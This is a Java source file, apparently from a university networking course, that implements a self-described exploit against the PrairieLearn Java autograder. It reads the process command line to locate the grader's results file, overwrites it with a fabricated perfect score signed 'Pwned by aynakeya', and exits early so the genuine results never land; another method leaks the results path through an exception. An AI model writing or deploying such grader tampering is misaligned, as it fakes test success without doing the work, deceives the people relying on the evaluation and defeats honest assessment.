package ca.ubc.cs317.dict.net;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.FileWriter;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

// exploit for https://github.com/PrairieLearn/PrairieLearn/tree/master/graders/java
public class PrairieLearnExploit {
    public static void pwn(){
        String cmdline;
        try {
            long pid = ProcessHandle.current().pid();
            String cmdlinePath = String.format("/proc/%d/cmdline",pid);
            cmdline = new String(Files.readAllBytes(Paths.get(cmdlinePath)), StandardCharsets.UTF_8);
        }catch (Exception e){
            // failed to find cmdline file
            System.exit(0);
            return;
        }
        Pattern pattern = Pattern.compile("/grade/results/[^/]*/\\d+.json");
//        String s = "java.lang.RuntimeException: java\\u0000-cp�/grade/classpath:/grade/classpath/json-simple-1.1.1.jar:/grade/classpath/junit-platform-console-standalone-1.7.0-all.jar:�JUnitAutograder�/grade/results/tmp.MKlJ1ZgTju/6058.json�/grade/tests/junit/ca/ubc/cs317/dict/tests/DictionaryConnectionTest.java��";
        Matcher matcher = pattern.matcher(cmdline);
        if (!matcher.find()){
            // failed to find tmp file
            System.exit(0);
            return;
        }
        // get temp file path
        System.out.println(matcher.group(0));
        JSONObject fake_test = newTest("Pwned","Pwned by aynakeya",
                16,16,"QAQ","OvO");
        JSONObject results = newResult(1,16,16,
                "PrairieLearn Java Autograder Exploit","Pwned by aynakeya",
                true,fake_test);
        try (FileWriter writer = new FileWriter(matcher.group(0))) {
            writer.write(results.toString());
        } catch (Exception e) {
            // failed to write;
            System.exit(0);
        }
        // exit to prevent overwrite
        System.exit(0);
    }

    public static JSONObject newTest(String name, String description,
                                   double points, double maxPoints,
                                   String output, String message) {
        JSONObject object = new JSONObject();
        object.put("name", name);
        object.put("description", description);
        object.put("points", points);
        object.put("max_points", maxPoints);
        object.put("output", output);
        object.put("message", message);
        return object;
    }

    public static JSONObject newResult(double score, double points,double maxPoints,
                                       String output,String message, boolean gradable,
                                       JSONObject ...tests) {
        JSONObject results = new JSONObject();
        // score 0-1
        results.put("score", score);
        results.put("points",points);
        results.put("max_points", maxPoints);
        results.put("output", output);
        results.put("message", message);
        results.put("gradable",gradable);
        JSONArray resultsTests = new JSONArray();
        for (JSONObject obj : tests) {
            resultsTests.add(obj);
        }
        results.put("tests", resultsTests);
        return results;
    }

    public static void leakingFailed() {
        throw new RuntimeException(String.format("temp file is %s",System.getenv("RESULTS_TEMP_FILE")));
    }
}
